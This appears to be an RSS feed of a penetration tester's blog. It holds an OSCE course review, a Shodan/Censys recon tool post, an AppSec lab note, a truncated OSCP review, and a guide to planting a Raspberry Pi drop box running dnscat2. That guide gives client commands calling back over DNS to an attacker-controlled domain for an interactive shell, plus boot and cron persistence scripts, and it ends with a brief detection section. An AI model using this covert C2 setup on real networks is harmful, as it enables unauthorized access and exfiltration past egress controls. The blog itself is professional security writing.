<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>The Subtlety</title>
    <link>https://www.thesubtlety.com/index.xml</link>
    <description>Recent content on The Subtlety</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sat, 11 Feb 2017 13:05:48 -0800</lastBuildDate>
    <atom:link href="https://www.thesubtlety.com/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>The OSCE | Cracking the Perimeter Review</title>
      <link>https://www.thesubtlety.com/post/2017-02-11-osce-review/</link>
      <pubDate>Sat, 11 Feb 2017 13:05:48 -0800</pubDate>
      
      <guid>https://www.thesubtlety.com/post/2017-02-11-osce-review/</guid>
      <description>

&lt;p&gt;&lt;img src=&#34;../img/ctp-boxes-small.png#floatright&#34; alt=&#34;ctp&#34; /&gt;
I recently took the &lt;a href=&#34;https://www.offensive-security.com/information-security-training/cracking-the-perimeter/&#34;&gt;CTP course&lt;/a&gt; by Offensive Security and passed the OSCE exam. Now there are a few dozen &lt;a href=&#34;https://www.google.com/search?q=osce+exam+review&#34;&gt;reviews&lt;/a&gt; on this thing, but I&amp;rsquo;ll add my own take here anyway.&lt;/p&gt;

&lt;h3 id=&#34;pre-course&#34;&gt;Pre Course&lt;/h3&gt;

&lt;p&gt;You can&amp;rsquo;t just register for the CTP - you need to solve a small challenge first: &lt;a href=&#34;http://fc4.me/&#34;&gt;http://fc4.me/&lt;/a&gt;. When I initially thought about taking this course, part of this challenge was beyond me. But to quote &lt;a href=&#34;https://blog.g0tmi1k.com/2013/08/cracking-perimeter-ctp-offensive/&#34;&gt;g0tmi1k&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;There isn&amp;rsquo;t any shame in not being able to complete this. It simply means you&amp;rsquo;re not ready&amp;hellip; yet! If you look up the solution online, you&amp;rsquo;re just cheating yourself and wasting both time and money. It&amp;rsquo;s been put there for a reason. Offsec is trying to protect you from yourself (in their own frustrating but necessary way!).&amp;rdquo;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;And so I began my prep for the course. Corelan&amp;rsquo;s &lt;a href=&#34;https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/&#34;&gt;exploit dev tutorials&lt;/a&gt;, Fuzzysec&amp;rsquo;s &lt;a href=&#34;https://www.fuzzysecurity.com/tutorials.html&#34;&gt;tutorials&lt;/a&gt;, and Stephen Bradshaw&amp;rsquo;s &lt;a href=&#34;http://www.thegreycorner.com/2010/12/introducing-vulnserver.html&#34;&gt;Vulnserver&lt;/a&gt; helped immensely. Having gone through, played with, and poked at that material, I was able to solve the initial challenge and set a course start date.&lt;/p&gt;

&lt;h3 id=&#34;course&#34;&gt;Course&lt;/h3&gt;

&lt;p&gt;The CTP syllabus is available &lt;a href=&#34;https://www.offensive-security.com/documentation/cracking-the-perimiter-syllabus.pdf&#34;&gt;here&lt;/a&gt; and gives a high level overview of what is covered. If you&amp;rsquo;ve taken the OSCP, it doesn&amp;rsquo;t cover nearly as much ground, and is much more focused on the following topics.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Web Application Angle&lt;/strong&gt; - The two modules covered here are a bit more complex that what you&amp;rsquo;d find in the OSCP but nothing too ground breaking. XSS, CSRF, LFI are covered but the scenarios are more real world than trivial examples I&amp;rsquo;ve seen elsewhere. Still valuable.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Backdooring and AV Bypass&lt;/strong&gt; - I hadn&amp;rsquo;t done this before and thought these modules were pretty fun. I fully realized that AV today is &amp;hellip; less than perfect and is really only catching the known bad. There are a billion ways to bypass even heuristics, especially if you can write just the smallest amount of code.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;0 Day Angle&lt;/strong&gt; - These modules cover fuzzing and the infamous HP Openview NNM exploit. NNM is usually what people talk about when they bring up the course. Muts actually covers this crazy exploit at Defcon 16 in this &lt;a href=&#34;https://www.youtube.com/watch?v=gHISpAZiAm0&#34;&gt;video&lt;/a&gt;. This module makes up a larger portion of the course work and was pretty enjoyable. I must say having read &lt;em&gt;Hacking: The Art of Exploitation&lt;/em&gt; and having some of those code samples available was also helpful to me here.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Networking Angle&lt;/strong&gt; - Spoofing SNMP and GRE tunnels. I barely recall this module. Although though seeing how devastating (and relatively straight forward) a MiTM attack can be at the infrastructure level was certainly eye opening.&lt;/p&gt;

&lt;p&gt;I learned a ton in this course. Definitely realized that the amount I don&amp;rsquo;t know about exploit development is pretty staggering. This is supposed to be an intermediate course but looking at the amount of research out there, some of this feels pretty entry level as the heap and ROP aren&amp;rsquo;t even mentioned. That said, the scope of the CTP is a bit wider than just exploit development, so maybe that&amp;rsquo;s a bit unfair, and I still found the course challenging. Several reviews do mention the dated material and that may be true, but I felt what was taught was entirely foundational. A person must walk before they run and the CTP course does an excellent job doing just that.&lt;/p&gt;

&lt;p&gt;Of course even excellent courses can be improved, and one thing that gave a bit of dissatisfaction was the lack of Extra Mile exercises going through the course like the OSCP course did. It seemed you could complete a module easily enough following the directions, have an basic starting point of where to research more, and then it was off to the next chapter. And perhaps this is by design, but I think I learned more while practicing for the exam than during the course itself. The course material gave me starting points, skeletons to work from, ideas to use, and from there I was able to fill in the blanks through additional research and practice.&lt;/p&gt;

&lt;h3 id=&#34;exam&#34;&gt;Exam&lt;/h3&gt;

&lt;p&gt;The 48 hour exam was not easy. The number of times I thought I was completely screwed, unprepared, and guaranteed failure was more than a few. And it was still somehow enjoyable! In general I found myself realizing I needed to think laterally, to take a step back and look at the big picture. The feeling of accomplishment after hours working through various potential paths and finally succeeding is hard to beat. I felt the OSCE exam had the perfect level of challenge and frustration without that feeling of impossibility. While everything on the exam is covered in the the course in principle, OffSec will never let you simply follow the directions to success. They teach principles and techniques and let you apply them creatively.&lt;/p&gt;

&lt;p&gt;I spent around sixteen hours on the exam the first day with quick breaks for coffee and lunch and forced myself to go to sleep before 1 am. I got around seven hours of sleep and then did another sixteen hours the next day before successfully completing all the challenges for full points. I strongly recommend getting a good night&amp;rsquo;s rest the first night and come back the next day planning on working late if need be.&lt;/p&gt;

&lt;p&gt;All in all, the CTP course was informative and valuable and the exam enjoyably challenging. Highly recommended.&lt;/p&gt;

&lt;h3 id=&#34;helpful-resources&#34;&gt;Helpful Resources&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/jhaddix/tbhm&#34;&gt;Web - Jason Haddix Bug Hunting Guide&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://packetstorm.foofus.com/papers/virus/BypassAVDynamics.pdf&#34;&gt;AV Bypass Techniques&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://pentest.blog/art-of-anti-detection-2-pe-backdoor-manufacturing/&#34;&gt;AV Bypass and PE Backdoors&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://packetstormsecurity.com/papers/virus/Taking_Back_Netcat.pdf&#34;&gt;AV Bypass - Taking Back Netcat&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/secfigo/Awesome-Fuzzing&#34;&gt;Fuzzing - Awesome-Fuzzing on Github&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://resources.infosecinstitute.com/fuzzing-vulnserver-discovering-vulnerable-commands-part-1/&#34;&gt;Fuzzing - Vulnserver Intro&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.thegreycorner.com/2010/12/introducing-vulnserver.html&#34;&gt;Fuzzing and Exploit Dev - Vulnserver&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/&#34;&gt;Exploit Dev - Corelan Tutorials&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/corelan/wallpapers/master/corelan_wallpaper_dark_1920-1080.png&#34;&gt;Exploit Dev - Corelan Wallpaper&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.fuzzysecurity.com/tutorials.html&#34;&gt;Exploit Dev - FuzzySec Windows Exploit Development Tutorial Series&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/enddo/awesome-windows-exploitation&#34;&gt;Exploit Dev - Awesome Windows Explation on Github&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.vividmachines.com/shellcode/shellcode.html&#34;&gt;Exploit Dev - How To Shellcode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.gosecure.it/blog/art/452/sec/create-a-custom-shellcode-using-system-function/&#34;&gt;Exploit Dev - Shellcode with System()&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/JohnTroony/HTAOE/blob/master/printable_helper.c&#34;&gt;Exploit Dev - ASCII Sub Generator&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Search Shodan and Censys With Shocens</title>
      <link>https://www.thesubtlety.com/post/2017-01-25-query-shodan-and-censys-with-shocens/</link>
      <pubDate>Wed, 25 Jan 2017 21:06:57 -0800</pubDate>
      
      <guid>https://www.thesubtlety.com/post/2017-01-25-query-shodan-and-censys-with-shocens/</guid>
      <description>

&lt;p&gt;Recon is close to &lt;a href=&#34;http://www.pentest-standard.org/index.php/Intelligence_Gathering&#34;&gt;step one&lt;/a&gt; in any pentest. When it comes to passively pulling data on infrastructure assets you have a number of options. &lt;a href=&#34;https://whois.arin.net/ui/advanced.jsp&#34;&gt;ARIN&lt;/a&gt; can help identify an organization&amp;rsquo;s registered net blocks, but that&amp;rsquo;s only part of the picture. With many organizations based in or using cloud services, those assets won&amp;rsquo;t necessarily be registered to your target.&lt;/p&gt;

&lt;p&gt;And when AWS for example can tie &lt;a href=&#34;https://aws.amazon.com/directconnect/&#34;&gt;directly into a datacenter&lt;/a&gt;, these servers become quite valuable. As an aside to AWS, check out &lt;a href=&#34;https://media.ccc.de/v/33c3-7865-gone_in_60_milliseconds&#34;&gt;Gone in 60 Milliseconds&lt;/a&gt; by &lt;a href=&#34;https://github.com/Miserlou&#34;&gt;Rich Jones&lt;/a&gt; - awesome talk. Now if a developer stands up a server with HTTPS using a corporate certificate it&amp;rsquo;s likely going to be picked up and indexed by someone, Shodan, or Censys - so let&amp;rsquo;s make use of that.&lt;/p&gt;

&lt;h2 id=&#34;shocens&#34;&gt;Shocens&lt;/h2&gt;

&lt;p&gt;I&amp;rsquo;ll cover Shodan and Censys in a bit more detail below, but suffice it to say I needed a tool that queried these search engines for specific organizations and let me do something useful with the data. Built in tools for Shodan are great for macro searches but I found myself wanting more when targeting a specific organization that had more than a few pages of data but didn&amp;rsquo;t consist of hundreds of thousands of results. The Python APIs and CLI tools available just weren&amp;rsquo;t quite what I was looking for.&lt;/p&gt;

&lt;p&gt;This being my small motivation along with a desire to do some more Ruby development, I wrote &lt;strong&gt;Shocens&lt;/strong&gt; - a little tool to&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;make basic queries of both Shodan and Censys&lt;/li&gt;
&lt;li&gt;parse the results with options to diff against past scans&lt;/li&gt;
&lt;li&gt;and output to csv and txt&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There is still a lot of potential to parse additional data from both search engines and cross query to fill in the blanks where one search engine has data while the other does not. It&amp;rsquo;s less than perfect, and you&amp;rsquo;ll obviously find the native search engines provide more power for complex queries. But it was fun to write, and still provides me a bit of value.&lt;/p&gt;

&lt;p&gt;More details on Shocens usage are available on Github - &lt;a href=&#34;https://github.com/thesubtlety/shocens&#34;&gt;https://github.com/thesubtlety/shocens&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;-&amp;gt; % ruby shocens.rb -q &#39;parsed.extensions=&amp;quot;shodan&amp;quot;&#39; -l 100
[+] Beginning Shodan search for org:google
[+] 687497 results in org:&amp;quot;google&amp;quot;
[+] Limiting results to 1 pages...

[+] Parsing page 1 of 1

Host:		104.131.0.69: ports 80
Server:		nginx/1.4.6 (Ubuntu)
Powered By:	
Title:		Shodan Internet Census
Cert Names:	
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Following is a brief overview of both Shodan and Censys along with various useful search filters.&lt;/p&gt;

&lt;h2 id=&#34;shodan&#34;&gt;Shodan&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://www.shodan.io/&#34;&gt;Shodan&lt;/a&gt; is &amp;ldquo;the world&amp;rsquo;s first search engine for Internet-connected devices&amp;rdquo;. There are quite a few resources out there on what Shodan is and how to use it so I won&amp;rsquo;t go into great detail. The slogan sums it up quite well. If there is a device reachable on the internet and you know what to look for, Shodan will help you find it.&lt;/p&gt;

&lt;h4 id=&#34;search-filters&#34;&gt;Search Filters&lt;/h4&gt;

&lt;p&gt;Where the real beauty of Shodan comes in is with filters&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;net:10425.89.0/24&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;org:Microsoft&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;title:tagged-scraped-content&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;html:search-the-page&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;product:banner-id&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;version:v1.2.3&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;city:Seattle&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;country:USA&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;geo:12.3456,78.9087&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hostname:.edu&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;os:AIX&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;port:80&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;before/after:01/01/1970&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Depending on what you&amp;rsquo;re looking to accomplish a combination of &lt;code&gt;net&lt;/code&gt;, &lt;code&gt;html&lt;/code&gt;, and &lt;code&gt;org&lt;/code&gt; have served me well for targeted recon. See the &lt;a href=&#34;https://developer.shodan.io/api/banner-specification&#34;&gt;banner-specs&lt;/a&gt; for more possible filters. And John Matherly himself wrote the &lt;a href=&#34;https://leanpub.com/shodan&#34;&gt;Complete Guide to Shodan&lt;/a&gt; starting at one dollar which is probably worth checking out.&lt;/p&gt;

&lt;h4 id=&#34;apis-and-credits&#34;&gt;APIs and Credits&lt;/h4&gt;

&lt;p&gt;It&amp;rsquo;s worth noting you&amp;rsquo;ll need an account to do anything useful with Shodan (beyond a simple query with one page of results). Using filters, seeing results beyond one page, and using the API requires a paid account. It&amp;rsquo;s only around ~$45USD, there are frequent deals on paid membership for full API access, maybe free for .edu, and totally worth it. This will give you around 10,000 results per month. Register &lt;a href=&#34;https://account.shodan.io/register&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&#34;resources&#34;&gt;Resources&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://pen-testing.sans.org/blog/2015/12/08/effective-shodan-searches/&#34;&gt;Effective Shodan Searches&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://danielmiessler.com/study/shodan/&#34;&gt;A Shodan Tutorial&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.exploit-db.com/docs/33859.pdf&#34;&gt;Searching Shodan for Fun and Profit&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;censys&#34;&gt;Censys&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://censys.io/&#34;&gt;Censys.io&lt;/a&gt; is &amp;ldquo;a search engine that allows computer scientists to ask questions about the devices and networks that compose the Internet&amp;rdquo;. Same thing as Shodan - it lets you identify what&amp;rsquo;s out there. They pull data daily and use Zmap to get their &lt;a href=&#34;https://scans.io/&#34;&gt;data&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&#34;search-filters-1&#34;&gt;Search Filters&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;Supports everything Shodan does and then some&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Actually, just go check out their website. The documentation is quite good. The &lt;a href=&#34;https://censys.io/overview&#34;&gt;Overview page&lt;/a&gt;, Examples tab has basic query examples, but you can really filter on just about anything. The following page covers a few: &lt;a href=&#34;https://www.censys.io/ipv4/72.14.246.220/table&#34;&gt;https://www.censys.io/ipv4/72.14.246.220/table&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Again, depending on what you&amp;rsquo;re looking for, I&amp;rsquo;ve had good luck using CIDR blocks: &lt;code&gt;127.0.0.1/24&lt;/code&gt;, parsing
certificates: &lt;code&gt;parsed.extensions=domain.tld&lt;/code&gt;, and ASes: &lt;code&gt;autonomous_system:description: &#39;Org Name&#39;&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&#34;apis-and-rate-limits&#34;&gt;APIs and Rate Limits&lt;/h4&gt;

&lt;p&gt;Again, you&amp;rsquo;ll need an account. Censys usage is free, though and you can register &lt;a href=&#34;https://censys.io/register&#34;&gt;here&lt;/a&gt;. You aren&amp;rsquo;t limited by specific searches per month per se as with Shodan, but rather you get a limited number of requests per five minute bucket.&lt;/p&gt;

&lt;h4 id=&#34;resources-1&#34;&gt;Resources&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://censys.io/about&#34;&gt;About Censys&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://jhalderm.com/pub/papers/censys-ccs15.pdf&#34;&gt;A Search Engine Backed by Internet-Wide Scanning&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Thanks for reading and happy searching!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Persistent C2 with dnscat2</title>
      <link>https://www.thesubtlety.com/post/persistent-dnscat2/</link>
      <pubDate>Mon, 19 Dec 2016 17:19:40 -0800</pubDate>
      
      <guid>https://www.thesubtlety.com/post/persistent-dnscat2/</guid>
      <description>

&lt;p&gt;Occasionally an environment has strict outbound rules with all traffic going through an authenticated proxy. This hampers exfiltration, especially if you don&amp;rsquo;t currently have valid credentials but need a foothold into an environment without phishing for instance. If we can find a live network jack in some accessible place and the switch hands out an IP address via DHCP along with DNS servers, we can more than likely obtain a foothold into the network.&lt;/p&gt;

&lt;p&gt;Thanks to some awesome work by &lt;a href=&#34;https://twitter.com/iagox86&#34;&gt;iagox86&lt;/a&gt;, these directions can be used to configure &lt;a href=&#34;https://github.com/iagox86/dnscat2&#34;&gt;dnscat2&lt;/a&gt; to automatically connect back to your server over DNS in an automated fashion, similar to a PwnPlug.&lt;/p&gt;

&lt;h2 id=&#34;prerequisites&#34;&gt;Prerequisites&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;A linux box (raspberry pi)&lt;/li&gt;
&lt;li&gt;A domain name&lt;/li&gt;
&lt;li&gt;A VPS&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;directions&#34;&gt;Directions&lt;/h2&gt;

&lt;h3 id=&#34;authoritative-dns&#34;&gt;Authoritative DNS&lt;/h3&gt;

&lt;p&gt;Configure an authoritative name server on the DNS provider account. Using namecheap for instance:&lt;/p&gt;

&lt;p&gt;Manage Domain &amp;gt; Advanced DNS &amp;gt; Add Personal DNS Servers &amp;gt; &lt;code&gt;ns1 == ip.ad.dre.ss&lt;/code&gt; and &lt;code&gt;ns2 == ip.ad.dre.ss&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Then, under Domain &amp;gt; Use Custom DNS &amp;gt; use &lt;code&gt;ns1.examplecom&lt;/code&gt; and &lt;code&gt;ns2.example.com&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Check this is working by running on the server: &lt;code&gt;sudo nc -vv -l -u -p53&lt;/code&gt; and from another machine &lt;code&gt;nslookup ns1.example.com&lt;/code&gt; to verify traffic is hitting this IP.&lt;/p&gt;

&lt;h3 id=&#34;set-up-dnscat2-server-side&#34;&gt;Set up dnscat2 server side&lt;/h3&gt;

&lt;p&gt;Log in to your VPS, get dnscat2, and install it.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# apt-get update
# apt-get -y install ruby-dev git make g++
# gem install bundler
# git clone https://github.com/iagox86/dnscat2.git
# cd dnscat2/server
# bundle install
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And start the server.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# ruby /home/admin/dnscat2/server/dnscat2.rb --secret=verysecret ns1.example.com
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;configure-the-client-raspberry-pi&#34;&gt;Configure the client/Raspberry Pi&lt;/h3&gt;

&lt;h4 id=&#34;compile-the-dnscat2-client&#34;&gt;Compile the dnscat2 client&lt;/h4&gt;

&lt;p&gt;On the Raspberry Pi or client&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ git clone https://github.com/iagox86/dnscat2.git
$ cd dnscat2/client/
$ make
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;At this point you can run dnscat2 with the following to confirm things are working. We&amp;rsquo;ll be coming back to this so no need to keep in running.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ sudo /home/rpi/dnscat2/client/dnscat --secret=verysecret --dns domain=ns1.example.com,type=TXT
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;You can also leave out the domain and instead specify an ip: &lt;code&gt;./dnscat --dns=server=1.2.3.4,port=53&lt;/code&gt; but this is a direct connection out port 53 which may be blocked. It also clearly shows dnscat2 on the wire and will likely be flagged by IDS/IPS&lt;/li&gt;
&lt;li&gt;You can specify various DNS record types but TXT records have been fairly stable for me in the past&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;configure-persistance&#34;&gt;Configure Persistance&lt;/h4&gt;

&lt;p&gt;We want our little remote computer to always be connected to us. Every time it&amp;rsquo;s plugged in, dnscat2 should be calling back to our infrastructure. In addition, DNS can be flaky so we always want to ensure there&amp;rsquo;s always a callback.&lt;/p&gt;

&lt;p&gt;Make &lt;code&gt;eth0&lt;/code&gt; ask for a DHCP address everytime it&amp;rsquo;s plugged in&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$cat /etc/networking/interfaces
  auto eth0
  allow-hotplug eth0
  iface eth0 inet dhcp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Add an &lt;code&gt;interface up&lt;/code&gt; start script&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$cat /home/rpi/start_dnscat2
  #!/bin/bash    
  echo &amp;quot;[+] Starting dnscat2...&amp;quot;
  tmux new -s dnscat -d /home/rpi/dnscat2/client/dnscat ns1.example.com
$ln -s  /home/rpi/start_dnscat2 /etc/network/if-up.d/start_dnscat2
$chmod +x /home/rpi/start_dnscat2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Configure &lt;code&gt;cron&lt;/code&gt; to check every five minutes if &lt;code&gt;dnscat2&lt;/code&gt; is running and start it if not.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$cat check_and_start_dnscat2.sh 
#!/bin/bash

if ! $(ps aux | grep -i &amp;quot;[t]mux&amp;quot; &amp;gt; /dev/null); then
    echo &amp;quot;[!] Starting dnscat2...&amp;quot;
        /home/rpi/start_dnscat2
else
    echo &amp;quot;[+] dnscat2 is running...&amp;quot;
fi

$crontab -e
*/5 * * * * /home/rpi/check_and_start_dnscat2.sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That&amp;rsquo;s it. Now whenever an interface comes up, dnscat2 will make a connection to the configured domain and check every 5 minutes if there is a connection, starting one if not.&lt;/p&gt;

&lt;h3 id=&#34;dnscat2-reference&#34;&gt;dnscat2 reference&lt;/h3&gt;

&lt;p&gt;dnscat2 isn&amp;rsquo;t super intuitive so some operational notes for quick reference:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Start the server under a tmux session&lt;/li&gt;
&lt;li&gt;Within the dnscat2 prompt, type &lt;code&gt;sessions&lt;/code&gt; to see what you have available and interact with &lt;code&gt;sessions -i 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Within a session type &lt;code&gt;help&lt;/code&gt; to list available commands and &lt;code&gt;shell&lt;/code&gt; then &lt;code&gt;session -i &amp;lt;window#&amp;gt;&lt;/code&gt; for an interactive shell&lt;/li&gt;
&lt;li&gt;Exit the shell session by &lt;code&gt;Control-z&lt;/code&gt; or &lt;code&gt;exit&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;identifying-dnscat2-on-the-wire&#34;&gt;Identifying dnscat2 on the wire&lt;/h3&gt;

&lt;p&gt;There are number of ways to identify malicious DNS traffic and &lt;a href=&#34;https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152&#34;&gt;this SANS paper&lt;/a&gt; details quite a few methods of identification. In addition, in this case we&amp;rsquo;re specifying TXT records which aren&amp;rsquo;t too common. &lt;a href=&#34;http://www.caida.org/publications/papers/2007/dns_anomalies/dns_anomalies.pdf&#34;&gt;One paper&lt;/a&gt; (Table 1) puts TXT record usage around 7% of a given large sample size. &lt;a href=&#34;http://blog.dinaburg.org/2012/11/bitsquatting-pcap-analysis-part-2-query.html&#34;&gt;Another&lt;/a&gt; puts that usage at closer to less than 1%.&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s difficult to directly prevent DNS tunnelling but with a bit of traffic and payload analysis an attacker who&amp;rsquo;s not careful is likely to be identified.&lt;/p&gt;

&lt;h3 id=&#34;resources&#34;&gt;Resources&lt;/h3&gt;

&lt;p&gt;Most of this info is from iagox86&amp;rsquo;s github and Lenny Zeltser&amp;rsquo;s write up on dnscat2.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/iagox86/dnscat2&#34;&gt;https://github.com/iagox86/dnscat2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md&#34;&gt;https://github.com/iagox86/dnscat2/blob/master/doc/authoritative_dns_setup.md&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://zeltser.com/c2-dns-tunneling/&#34;&gt;https://zeltser.com/c2-dns-tunneling/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152&#34;&gt;https://www.sans.org/reading-room/whitepapers/dns/detecting-dns-tunneling-34152&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>OpenDNS&#39;s AppSec Training Lab</title>
      <link>https://www.thesubtlety.com/post/opendnss-appsec-training-lab/</link>
      <pubDate>Sun, 23 Aug 2015 00:27:58 +0000</pubDate>
      
      <guid>https://www.thesubtlety.com/post/opendnss-appsec-training-lab/</guid>
      <description>&lt;p&gt;I came across OpenDNS Security Ninjas AppSec &lt;a href=&#34;https://github.com/opendns/Security_Ninjas_AppSec_Training&#34;&gt;Training Lab&lt;/a&gt; not too long ago and found its simplicity rather enjoyable. It&amp;rsquo;s a simple web app written in PHP which illustrates each of the &lt;a href=&#34;https://www.owasp.org/index.php/Top_10_2013-Table_of_Contents&#34;&gt;OWASP Top 10&lt;/a&gt; categories. As I was going through the exercises I found myself checking to see how the vulnerable code was written and how the issues could be remediated.&lt;/p&gt;

&lt;p&gt;Since the lab is geared towards beginners, I thought it might be helpful to provide brief explanations along with links to the relevant lines of source code. For each level/OWASP vulnerability, I simply added a &amp;ldquo;Why&amp;rdquo; section to each &amp;ldquo;Solution&amp;rdquo; area linking to the sink on Github along with a brief explanation.&lt;/p&gt;

&lt;p&gt;The merge request is apparently pending an OpenDNS maintainer, but the fork is on &lt;a href=&#34;https://github.com/thesubtlety/Security_Ninjas_AppSec_Training&#34;&gt;Github&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>The OSCP | Penetration Testing With Kali Linux</title>
      <link>https://www.thesubtlety.com/post/the-oscp-penetration-testing-with-kali-linux/</link>
      <pubDate>Sat, 20 Dec 2014 22:03:29 +0000</pubDate>
      
      <guid>https://www.thesubtlety.com/post/the-oscp-penetration-testing-with-kali-linux/</guid>
      <description>
&lt;figure &gt;
    
        &lt;img src=&#34;https://www.thesubtlety.com/img/pwk-box-small-128x150.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I&amp;rsquo;ve spent the last few months working through the &lt;a href=&#34;http://www.offensive-security.com/information-security-training/penetration-testing-with-kali-linux/&#34;&gt;Penetration Testing with Kali Linux&lt;/a&gt; course by Offensive Security which has been an awesome &lt;a href=&#34;http://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf&#34;&gt;learning&lt;/a&gt; experience.&lt;/p&gt;

&lt;p&gt;Much has been said on this course and I&amp;rsquo;ll only briefly go over my experience and takeaways. The following reviews were helpful in making the decision to take the course.&lt;/p&gt;

&lt;ul&gt;
